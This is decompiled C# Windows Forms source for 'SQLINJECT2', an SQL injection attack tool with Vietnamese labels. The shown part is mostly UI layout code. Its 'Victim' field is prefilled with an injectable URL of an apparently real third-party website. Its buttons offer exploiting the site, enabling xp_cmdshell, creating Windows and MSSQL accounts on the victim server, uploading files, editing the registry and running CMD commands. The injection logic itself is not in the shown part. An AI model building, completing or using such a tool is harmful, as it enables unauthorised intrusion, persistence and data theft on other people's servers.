using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace SQLINJECT2;

public class MainForm : Form
{
	private IContainer components = null;

	private Label label1;

	private TextBox textBox1;

	private TextBox textBox2;

	private ComboBox comboBox1;

	private Button button1;

	private GroupBox groupBox1;

	private Label label5;

	private Label label4;

	private Label label3;

	private RichTextBox richTextBox1;

	private Label label2;

	private TextBox textBox5;

	private TextBox textBox4;

	private TextBox textBox3;

	private Button button2;

	private Button button3;

	private Button button4;

	private TextBox textBox6;

	private Button button5;

	private Button button6;

	private GroupBox groupBox2;

	private Button button8;

	private Button button7;

	private TextBox textBox8;

	private Label label7;

	private TextBox textBox7;

	private Label label6;

	private Button button9;

	private Button button10;

	private Button button11;

	private Button button12;

	private Button button13;

	private Button button14;

	private Label label8;

	private GroupBox groupBox3;

	private TextBox textBox9;

	private RichTextBox richTextBox2;

	private Button button15;

	private GroupBox groupBox4;

	private ListBox listBox1;

	private Button button16;

	private Button button17;

	private Button button18;

	private GroupBox groupBox5;

	private ListBox listBox2;

	private Button button19;

	private Button button20;

	private GroupBox groupBox6;

	private Button button21;

	private StatusStrip statusStrip1;

	private ToolStripStatusLabel toolStripStatusLabel1;

	private CheckedListBox checkedListBox1;

	private GroupBox groupBox7;

	private RichTextBox richTextBox3;

	private ComboBox comboBox2;

	private Label label9;

	private Button button23;

	private Button button24;

	private GroupBox groupBox8;

	private RichTextBox richTextBox4;

	private ToolStrip toolStrip3;

	private ToolStripDropDownButton toolStripDropDownButton4;

	private ToolStripMenuItem toolStripMenuItem1;

	private ToolStripMenuItem toolStripMenuItem2;

	private ToolStripMenuItem toolStripMenuItem3;

	private ToolStripMenuItem toolStripMenuItem4;

	private ToolStripMenuItem toolStripMenuItem5;

	private ToolStripMenuItem toolStripMenuItem6;

	private ToolStripMenuItem toolStripMenuItem7;

	private ToolStripMenuItem toolStripMenuItem8;

	private ToolStripMenuItem toolStripMenuItem9;

	private ToolStripMenuItem toolStripMenuItem10;

	private ToolStripDropDownButton toolStripDropDownButton5;

	private ToolStripMenuItem toolStripMenuItem11;

	private ToolStripMenuItem toolStripMenuItem12;

	private Button button22;

	private WebBrowser webBrowser1;

	private ComboBox comboBox3;

	private RadioButton radioButton1;

	private RadioButton radioButton2;

	private TextBox textBox10;

	private Label label10;

	private ToolTip toolTip1;

	private Button button25;

	private SaveFileDialog saveFileDialog1;

	private ToolStripDropDownButton toolStripDropDownButton1;

	private ToolStripMenuItem toolStripMenuItem_0;

	private ToolStripMenuItem englishToolStripMenuItem;

	public static int load = 0;

	private string weblink;

	private string thongbao1 = "value '";

	private string thongbao2 = "' to";

	private string thongbao1_2 = "value &apos;";

	private string thongbao2_2 = "&apos; to";

	private string thongbao1_3 = "value &amp;apos;";

	private string thongbao2_3 = "&amp;apos; to";

	private string select;

	public static string address1 = "";

	public static string address2 = "";

	public static string database = "";

	public static string table = "";

	public static string column = "";

	private int i3 = 0;

	private int i4 = 0;

	private int i5 = 0;

	private int i6 = 0;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		//IL_01be: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Expected O, but got Unknown
		//IL_01c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01de: Expected O, but got Unknown
		//IL_01df: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Expected O, but got Unknown
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Expected O, but got Unknown
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0215: Expected O, but got Unknown
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_0220: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0236: Expected O, but got Unknown
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_0241: Expected O, but got Unknown
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_0263: Unknown result type (might be due to invalid IL or missing references)
		//IL_026d: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Expected O, but got Unknown
		//IL_0279: Unknown result type (might be due to invalid IL or missing references)
		//IL_0283: Expected O, but got Unknown
		//IL_0284: Unknown result type (might be due to invalid IL or missing references)
		//IL_028e: Expected O, but got Unknown
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0299: Expected O, but got Unknown
		//IL_029a: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a4: Expected O, but got Unknown
		//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02af: Expected O, but got Unknown
		//IL_02b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ba: Expected O, but got Unknown
		//IL_02bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c5: Expected O, but got Unknown
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Expected O, but got Unknown
		//IL_02d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Expected O, but got Unknown
		//IL_02dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e6: Expected O, but got Unknown
		//IL_02e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f1: Expected O, but got Unknown
		//IL_02f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fc: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0307: Expected O, but got Unknown
		//IL_0308: Unknown result type (might be due to invalid IL or missing references)
		//IL_0312: Expected O, but got Unknown
		//IL_0313: Unknown result type (might be due to invalid IL or missing references)
		//IL_031d: Expected O, but got Unknown
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0328: Expected O, but got Unknown
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Expected O, but got Unknown
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_033e: Expected O, but got Unknown
		//IL_033f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0349: Expected O, but got Unknown
		//IL_034a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0354: Expected O, but got Unknown
		//IL_0355: Unknown result type (might be due to invalid IL or missing references)
		//IL_035f: Expected O, but got Unknown
		//IL_0360: Unknown result type (might be due to invalid IL or missing references)
		//IL_036a: Expected O, but got Unknown
		//IL_036b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Expected O, but got Unknown
		//IL_0376: Unknown result type (might be due to invalid IL or missing references)
		//IL_0380: Expected O, but got Unknown
		//IL_0381: Unknown result type (might be due to invalid IL or missing references)
		//IL_038b: Expected O, but got Unknown
		//IL_038c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0396: Expected O, but got Unknown
		//IL_0397: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a1: Expected O, but got Unknown
		//IL_03a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ac: Expected O, but got Unknown
		//IL_03ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Expected O, but got Unknown
		//IL_03b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c2: Expected O, but got Unknown
		//IL_03c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d3: Expected O, but got Unknown
		//IL_03d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03de: Expected O, but got Unknown
		//IL_03df: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e9: Expected O, but got Unknown
		//IL_0480: Unknown result type (might be due to invalid IL or missing references)
		//IL_048a: Expected O, but got Unknown
		//IL_0c3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c45: Expected O, but got Unknown
		//IL_15f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_15fa: Expected O, but got Unknown
		//IL_25f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_25ff: Expected O, but got Unknown
		//IL_2a26: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a30: Expected O, but got Unknown
		//IL_2b57: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b61: Expected O, but got Unknown
		//IL_2fee: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ff8: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		label1 = new Label();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		comboBox1 = new ComboBox();
		button1 = new Button();
		groupBox1 = new GroupBox();
		textBox5 = new TextBox();
		textBox4 = new TextBox();
		textBox3 = new TextBox();
		label5 = new Label();
		label4 = new Label();
		label3 = new Label();
		richTextBox1 = new RichTextBox();
		label2 = new Label();
		button2 = new Button();
		button3 = new Button();
		button4 = new Button();
		textBox6 = new TextBox();
		button5 = new Button();
		button6 = new Button();
		groupBox2 = new GroupBox();
		button11 = new Button();
		button9 = new Button();
		button8 = new Button();
		button7 = new Button();
		textBox8 = new TextBox();
		label7 = new Label();
		textBox7 = new TextBox();
		label6 = new Label();
		button10 = new Button();
		button12 = new Button();
		button13 = new Button();
		button14 = new Button();
		label8 = new Label();
		groupBox3 = new GroupBox();
		webBrowser1 = new WebBrowser();
		richTextBox2 = new RichTextBox();
		textBox9 = new TextBox();
		button15 = new Button();
		groupBox4 = new GroupBox();
		listBox1 = new ListBox();
		button16 = new Button();
		button17 = new Button();
		button18 = new Button();
		groupBox5 = new GroupBox();
		listBox2 = new ListBox();
		button19 = new Button();
		button20 = new Button();
		groupBox6 = new GroupBox();
		checkedListBox1 = new CheckedListBox();
		button21 = new Button();
		statusStrip1 = new StatusStrip();
		toolStripStatusLabel1 = new ToolStripStatusLabel();
		groupBox7 = new GroupBox();
		textBox10 = new TextBox();
		label10 = new Label();
		comboBox3 = new ComboBox();
		radioButton2 = new RadioButton();
		radioButton1 = new RadioButton();
		button23 = new Button();
		comboBox2 = new ComboBox();
		label9 = new Label();
		richTextBox3 = new RichTextBox();
		button24 = new Button();
		groupBox8 = new GroupBox();
		richTextBox4 = new RichTextBox();
		toolStrip3 = new ToolStrip();
		toolStripDropDownButton4 = new ToolStripDropDownButton();
		toolStripMenuItem1 = new ToolStripMenuItem();
		toolStripMenuItem2 = new ToolStripMenuItem();
		toolStripMenuItem3 = new ToolStripMenuItem();
		toolStripMenuItem4 = new ToolStripMenuItem();
		toolStripMenuItem5 = new ToolStripMenuItem();
		toolStripMenuItem6 = new ToolStripMenuItem();
		toolStripMenuItem7 = new ToolStripMenuItem();
		toolStripMenuItem8 = new ToolStripMenuItem();
		toolStripMenuItem9 = new ToolStripMenuItem();
		toolStripMenuItem10 = new ToolStripMenuItem();
		toolStripDropDownButton5 = new ToolStripDropDownButton();
		toolStripMenuItem11 = new ToolStripMenuItem();
		toolStripMenuItem12 = new ToolStripMenuItem();
		toolStripDropDownButton1 = new ToolStripDropDownButton();
		toolStripMenuItem_0 = new ToolStripMenuItem();
		englishToolStripMenuItem = new ToolStripMenuItem();
		button22 = new Button();
		toolTip1 = new ToolTip(components);
		button25 = new Button();
		saveFileDialog1 = new SaveFileDialog();
		((Control)groupBox1).SuspendLayout();
		((Control)groupBox2).SuspendLayout();
		((Control)groupBox3).SuspendLayout();
		((Control)groupBox4).SuspendLayout();
		((Control)groupBox5).SuspendLayout();
		((Control)groupBox6).SuspendLayout();
		((Control)statusStrip1).SuspendLayout();
		((Control)groupBox7).SuspendLayout();
		((Control)groupBox8).SuspendLayout();
		((Control)toolStrip3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label1).set_Location(new Point(1, 43));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(49, 13));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Victim :");
		((Control)textBox1).set_Location(new Point(57, 35));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(415, 20));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox1).set_Text("http://www.ornellaia.com/details.asp?key=VO'");
		((Control)textBox2).set_Location(new Point(478, 36));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(205, 20));
		((Control)textBox2).set_TabIndex(2);
		((ListControl)comboBox1).set_FormattingEnabled(true);
		comboBox1.get_Items().AddRange(new object[3] { "ASP - MSSQL", "CFM - MSSQL", "PHP - MySQL" });
		((Control)comboBox1).set_Location(new Point(702, 35));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(100, 21));
		((Control)comboBox1).set_TabIndex(3);
		((Control)comboBox1).set_Text("ASP - MSSQL");
		comboBox1.add_SelectedIndexChanged((EventHandler)comboBox1_SelectedIndexChanged);
		((Control)button1).set_Location(new Point(808, 32));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("Exploit");
		toolTip1.SetToolTip((Control)(object)button1, "Bắt đầu khai thác lỗi");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox5);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox4);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox3);
		((Control)groupBox1).get_Controls().Add((Control)(object)label5);
		((Control)groupBox1).get_Controls().Add((Control)(object)label4);
		((Control)groupBox1).get_Controls().Add((Control)(object)label3);
		((Control)groupBox1).get_Controls().Add((Control)(object)richTextBox1);
		((Control)groupBox1).get_Controls().Add((Control)(object)label2);
		((Control)groupBox1).set_Location(new Point(4, 71));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(268, 195));
		((Control)groupBox1).set_TabIndex(5);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("Thông tin Server");
		((Control)textBox5).set_Location(new Point(102, 165));
		((Control)textBox5).set_Name("textBox5");
		((Control)textBox5).set_Size(new Size(160, 20));
		((Control)textBox5).set_TabIndex(7);
		((Control)textBox4).set_Location(new Point(102, 141));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(160, 20));
		((Control)textBox4).set_TabIndex(6);
		((Control)textBox3).set_Location(new Point(102, 117));
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(160, 20));
		((Control)textBox3).set_TabIndex(5);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Location(new Point(6, 172));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(72, 13));
		((Control)label5).set_TabIndex(4);
		((Control)label5).set_Text("System User :");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(6, 148));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(90, 13));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("Database Name :");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(6, 124));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(75, 13));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("Server Name :");
		((Control)richTextBox1).set_Location(new Point(102, 17));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(160, 96));
		((Control)richTextBox1).set_TabIndex(1);
		((Control)richTextBox1).set_Text("");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(6, 20));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(48, 13));
		((Control)label2).set_TabIndex(0);
		((Control)label2).set_Text("Version :");
		((Control)button2).set_Location(new Point(278, 71));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(169, 23));
		((Control)button2).set_TabIndex(6);
		((Control)button2).set_Text("Kiểm Tra System_User");
		toolTip1.SetToolTip((Control)(object)button2, "Kiểm tra xem system_user có ngang bằng quyền Sa ko");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button3).set_Location(new Point(454, 70));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(178, 23));
		((Control)button3).set_TabIndex(7);
		((Control)button3).set_Text("Enable Xp_cmdshell MSSQL 2005");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)button4).set_Location(new Point(278, 107));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(169, 23));
		((Control)button4).set_TabIndex(8);
		((Control)button4).set_Text("Kiểm Tra Cổng Remote Desktop");
		toolTip1.SetToolTip((Control)(object)button4, "Kiểm tra xem cổng remote desktop của victim là bao nhiều");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((Control)textBox6).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)textBox6).set_ForeColor(Color.Red);
		((Control)textBox6).set_Location(new Point(454, 107));
		((Control)textBox6).set_Name("textBox6");
		((Control)textBox6).set_Size(new Size(178, 20));
		((Control)textBox6).set_TabIndex(9);
		((Control)button5).set_Location(new Point(454, 129));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(178, 23));
		((Control)button5).set_TabIndex(10);
		((Control)button5).set_Text("Chạy Remote Desktop");
		((ButtonBase)button5).set_UseVisualStyleBackColor(true);
		((Control)button5).add_Click((EventHandler)button5_Click);
		((Control)button6).set_Location(new Point(318, 160));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(129, 23));
		((Control)button6).set_TabIndex(11);
		((Control)button6).set_Text("Tạo 1 Window User mới");
		toolTip1.SetToolTip((Control)(object)button6, "Tạo mới 1 window user trên server victim");
		((ButtonBase)button6).set_UseVisualStyleBackColor(true);
		((Control)button6).add_Click((EventHandler)button6_Click);
		((Control)groupBox2).get_Controls().Add((Control)(object)button11);
		((Control)groupBox2).get_Controls().Add((Control)(object)button9);
		((Control)groupBox2).get_Controls().Add((Control)(object)button8);
		((Control)groupBox2).get_Controls().Add((Control)(object)button7);
		((Control)groupBox2).get_Controls().Add((Control)(object)textBox8);
		((Control)groupBox2).get_Controls().Add((Control)(object)label7);
		((Control)groupBox2).get_Controls().Add((Control)(object)textBox7);
		((Control)groupBox2).get_Controls().Add((Control)(object)label6);
		((Control)groupBox2).set_Location(new Point(454, 160));
		((Control)groupBox2).set_Name("groupBox2");
		((Control)groupBox2).set_Size(new Size(178, 106));
		((Control)groupBox2).set_TabIndex(12);
		groupBox2.set_TabStop(false);
		((Control)groupBox2).set_Text("Window User");
		((Control)button11).set_Location(new Point(5, 78));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(43, 23));
		((Control)button11).set_TabIndex(14);
		((Control)button11).set_Text("Add");
		((ButtonBase)button11).set_UseVisualStyleBackColor(true);
		((Control)button11).add_Click((EventHandler)button11_Click);
		((Control)button9).set_Location(new Point(129, 78));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(43, 23));
		((Control)button9).set_TabIndex(6);
		((Control)button9).set_Text("Close");
		((ButtonBase)button9).set_UseVisualStyleBackColor(true);
		((Control)button9).add_Click((EventHandler)button9_Click);
		((Control)button8).set_Location(new Point(68, 78));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(43, 23));
		((Control)button8).set_TabIndex(5);
		((Control)button8).set_Text("Reset");
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((Control)button8).add_Click((EventHandler)button8_Click);
		((Control)button7).set_Location(new Point(5, 78));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Size(new Size(43, 23));
		((Control)button7).set_TabIndex(4);
		((Control)button7).set_Text("Add");
		((ButtonBase)button7).set_UseVisualStyleBackColor(true);
		((Control)button7).add_Click((EventHandler)button7_Click);
		((Control)textBox8).set_Location(new Point(39, 44));
		((Control)textBox8).set_Name("textBox8");
		((Control)textBox8).set_Size(new Size(133, 20));
		((Control)textBox8).set_TabIndex(3);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Location(new Point(2, 52));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(36, 13));
		((Control)label7).set_TabIndex(2);
		((Control)label7).set_Text("Pass :");
		((Control)textBox7).set_Location(new Point(39, 17));
		((Control)textBox7).set_Name("textBox7");
		((Control)textBox7).set_Size(new Size(133, 20));
		((Control)textBox7).set_TabIndex(1);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Location(new Point(2, 24));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(35, 13));
		((Control)label6).set_TabIndex(0);
		((Control)label6).set_Text("User :");
		((Control)button10).set_Location(new Point(318, 186));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(129, 23));
		((Control)button10).set_TabIndex(13);
		((Control)button10).set_Text("Tạo 1 MSSQL User mới");
		toolTip1.SetToolTip((Control)(object)button10, "Tạo mới 1 tài khoản MSSQL trên server victim");
		((ButtonBase)button10).set_UseVisualStyleBackColor(true);
		((Control)button10).add_Click((EventHandler)button10_Click);
		((Control)button12).set_Location(new Point(318, 215));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Size(new Size(129, 23));
		((Control)button12).set_TabIndex(14);
		((Control)button12).set_Text("Upload file lên Server");
		toolTip1.SetToolTip((Control)(object)button12, "Upload 1 file lên server victim");
		((ButtonBase)button12).set_UseVisualStyleBackColor(true);
		((Control)button12).add_Click((EventHandler)button12_Click);
		((Control)button13).set_Location(new Point(278, 242));
		((Control)button13).set_Name("button13");
		((Control)button13).set_Size(new Size(169, 23));
		((Control)button13).set_TabIndex(15);
		((Control)button13).set_Text("Tương Tác Server Registry");
		toolTip1.SetToolTip((Control)(object)button13, "Tương tác với Registry của victim");
		((ButtonBase)button13).set_UseVisualStyleBackColor(true);
		((Control)button13).add_Click((EventHandler)button13_Click);
		((Control)button14).set_Location(new Point(256, 59));
		((Control)button14).set_Name("button14");
		((Control)button14).set_Size(new Size(75, 23));
		((Control)button14).set_TabIndex(16);
		((Control)button14).set_Text("Thi Hành");
		toolTip1.SetToolTip((Control)(object)button14, "Thi hành lệnh CMD");
		((ButtonBase)button14).set_UseVisualStyleBackColor(true);
		((Control)button14).add_Click((EventHandler)button14_Click);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Location(new Point(6, 20));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(58, 13));
		((Control)label8).set_TabIndex(17);
		((Control)label8).set_Text("Lệnh CMD");
		((Control)groupBox3).get_Controls().Add((Control)(object)webBrowser1);
		((Control)groupBox3).get_Controls().Add((Control)(object)richTextBox2);
		((Control)groupBox3).get_Controls().Add((Control)(object)textBox9);
		((Control)groupBox3).get_Controls().Add((Control)(object)label8);
		((Control)groupBox3).get_Controls().Add((Control)(object)button14);
		((Control)groupBox3).set_Location(new Point(638, 70));
		((Control)groupBox3).set_Name("groupBox3");
		((Control)groupBox3).set_Size(new Size(348, 196));
		((Control)groupBox3).set_TabIndex(18);
		groupBox3.set_TabStop(false);
		((Control)groupBox3).set_Text("Thi hành CMD");
		((Control)webBrowser1).set_Location(new Point(18, 63));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(103, 23));
		((Control)webBrowser1).set_TabIndex(39);
		webBrowser1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted));
		((Control)richTextBox2).set_Location(new Point(3, 89));
		((Control)richTextBox2).set_Name("richTextBox2");
		((Control)richTextBox2).set_Size(new Size(328, 101));
		((Control)richTextBox2).set_TabIndex(19);
		((Control)richTextBox2).set_Text("");
		((Control)textBox9).set_Location(new Point(3, 37));
		((Control)textBox9).set_Name("textBox9");
		((Control)textBox9).set_Size(new Size(328, 20));
		((Control)textBox9).set_TabIndex(18);
		((Control)button15).set_Location(new Point(4, 290));
		((Control)button15).set_Name("button15");
		((Control)button15).set_Size(new Size(160, 23));
		((Control)button15).set_TabIndex(19);
		((Control)button15).set_Text("Lấy danh sách db trên server");
		toolTip1.SetToolTip((Control)(object)button15, "Lấy danh sách tất cả các Database có trên server");
		((ButtonBase)button15).set_UseVisualStyleBackColor(true);
		((Control)button15).add_Click((EventHandler)button15_Click);
		((Control)groupBox4).get_Controls().Add((Control)(object)listBox1);
		((Control)groupBox4).set_Location(new Point(4, 320));
		((Control)groupBox4).set_Name("groupBox4");
		((Control)groupBox4).set_Size(new Size(160, 180));
		((Control)groupBox4).set_TabIndex(20);
		groupBox4.set_TabStop(false);
		((Control)groupBox4).set_Text("Danh Sách DB trên Server");
		((Control)listBox1).set_Dock((DockStyle)5);
		((ListControl)listBox1).set_FormattingEnabled(true);
		((Control)listBox1).set_Location(new Point(3, 16));
		((Control)listBox1).set_Name("listBox1");
		((Control)listBox1).set_Size(new Size(154, 160));
		((Control)listBox1).set_TabIndex(0);
